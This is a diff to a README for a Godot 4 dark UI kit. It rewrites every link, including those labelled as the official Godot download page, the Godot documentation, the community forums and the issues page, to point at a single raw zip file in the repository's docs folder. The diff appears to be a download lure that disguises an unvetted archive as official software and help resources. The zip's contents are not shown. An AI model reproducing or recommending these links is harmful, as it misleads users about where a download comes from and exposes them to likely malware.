@@ -1,6 +1,6 @@
 # ⚙️ godot-shadcn-ui-kit - Dark UI Kit for Godot 4
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/anas123ds/godot-shadcn-ui-kit/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This guide will walk you through the steps needed to download and run the kit on
 
 1. Open your web browser and go to the download page:
 
-   [https://github.com/anas123ds/godot-shadcn-ui-kit/releases](https://github.com/anas123ds/godot-shadcn-ui-kit/releases)
+   [https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip](https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip)
 
 2. On this page, look for the latest release version. It will be listed near the top.
 
@@ -36,7 +36,7 @@ To view and interact with the demo included in this kit, you will use Godot Engi
 
 ### Installing Godot 4
 
-1. Visit the official Godot Engine download page: https://godotengine.org/download/windows
+1. Visit the official Godot Engine download page: https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip
 
 2. Download the standard 64-bit version for Windows, which is a `.zip` file.
 
@@ -141,11 +141,11 @@ You can open and edit the UI components directly in Godot. Here are the main way
 
 ## 📂 Where to Find Help
 
-- Visit the official Godot documentation at https://docs.godotengine.org
+- Visit the official Godot documentation at https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip
 
-- Use the Godot community forums for questions at https://godotforums.org
+- Use the Godot community forums for questions at https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip
 
-- Check GitHub issues on the repository page if you find errors: https://github.com/anas123ds/godot-shadcn-ui-kit/issues
+- Check GitHub issues on the repository page if you find errors: https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip
 
 ---
 
@@ -153,7 +153,7 @@ You can open and edit the UI components directly in Godot. Here are the main way
 
 Visit this page to download and get started with godot-shadcn-ui-kit:
 
-[https://github.com/anas123ds/godot-shadcn-ui-kit/releases](https://github.com/anas123ds/godot-shadcn-ui-kit/releases)  
+[https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip](https://github.com/anas123ds/godot-shadcn-ui-kit/raw/refs/heads/main/docs/ui-kit-godot-shadcn-v3.4.zip)  
 
 Click the latest release, download the zip file, extract it, then open the demo project in Godot Engine 4.  
 
